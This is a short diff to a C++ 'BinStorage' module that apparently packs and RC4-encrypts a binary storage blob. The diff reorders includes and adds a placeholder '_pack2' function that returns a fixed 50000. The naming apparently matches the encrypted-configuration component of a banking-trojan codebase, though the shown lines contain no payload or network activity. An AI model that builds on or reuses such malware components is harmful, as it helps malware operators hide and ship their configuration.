@@ -1,11 +1,10 @@
-#include <windows.h>
+#include "common/rl_kernel.h"
 
-#include <common/binstorage.h>
-#include <common/str.h>
-#include <common/mem.h>
-#include <common/ucl.h>
+#include "common/binstorage.h"
+#include "common/mem.h"
+#include "common/str.h"
+#include "common/ucl.h"
 #include "common/fs.h"
-
 
 #define SHF_REMOVED 0x1 //Ёлемент удален.
 
@@ -226,6 +225,11 @@ bool BinStorage::_getItemDataAsDword(const STORAGE *binStorage, DWORD id, DWORD 
   return r;
 }
 
+
+DWORD BinStorage::_pack2(STORAGE **binStorage, DWORD flags, Crypt::RC4KEY *rc4Key)
+{ //DWORD size = binStorage->size; 
+return 50000;}
+
 DWORD BinStorage::_pack(STORAGE **binStorage, DWORD flags, Crypt::RC4KEY *rc4Key)
 {  
   STORAGE *oldStorage = *binStorage;
@@ -296,7 +300,7 @@ DWORD BinStorage::_pack(STORAGE **binStorage, DWORD flags, Crypt::RC4KEY *rc4Key
     else
     {
       Crypt::_generateBinaryData(newStorage->randData, sizeof(newStorage->randData), 0, 0xFF, false);
-
+      
       DWORD size = newStorage->size;
       if(rc4Key != NULL)
       {
@@ -311,7 +315,7 @@ DWORD BinStorage::_pack(STORAGE **binStorage, DWORD flags, Crypt::RC4KEY *rc4Key
       *binStorage = newStorage;
       return size;
     }
-  }
+  } 
   return 0;
 }
 
